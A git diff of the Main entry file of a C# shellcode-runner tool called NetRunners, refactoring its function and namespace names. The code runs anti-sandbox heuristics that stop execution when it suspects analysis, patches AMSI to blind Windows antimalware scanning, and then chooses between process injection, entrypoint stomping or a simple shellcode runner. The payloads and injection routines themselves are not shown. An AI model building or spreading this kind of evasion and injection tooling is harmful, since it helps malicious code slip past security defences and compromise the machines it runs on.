@@ -1,7 +1,7 @@
 ﻿using System;
-using static NetRunners.Runners;
-using static NetRunners.Heuristics;
-using static NetRunners.Patchers;
+using static NetRunners.Runners.Runners;
+using static NetRunners.Heuristics.Heuristics;
+using static NetRunners.Patchers.Patchers;
 
 namespace NetRunners
 {
@@ -17,8 +17,11 @@ namespace NetRunners
         static void Main(string[] args)
         {
             // call heuristic functions
-            if (Sleep()) { return; }    // if sleep was skipped halt execution
-            if (NonEmulated()) { return; }    // if apis were not emulatd halt execution
+            if ((Sleep()) || (NonEmulated()))
+            {
+                return;
+            }
+            patchAmsi(); // patch amsi
 
             // check args number
             if (args.Length > 1)
@@ -27,9 +30,6 @@ namespace NetRunners
                 return;
             }
 
-            // patch amsi
-            AmsiOs();
-
             // Determine the function call based on the argument provided, case insensitive
             string call = args.Length == 1 ? args[0] : string.Empty;
             switch (call.ToLower())
@@ -37,17 +37,17 @@ namespace NetRunners
                 // process injection runner
                 case "-pi":
                     Console.WriteLine("[+] Process Injection selected!");
-                    PiRunner();
+                    piRun();
                     break;
                 // entrypoint stomping runner
                 case "-eps":
                     Console.WriteLine("[+] EntryPoint Stomping selected!");
-                    EpsRunner();
+                    epsRun();
                     break;
                 // simple runner
                 default:
                     Console.WriteLine("[+] Shellcode Runner selected!");
-                    Runner();
+                    Run();
                     break;
             }     
         }
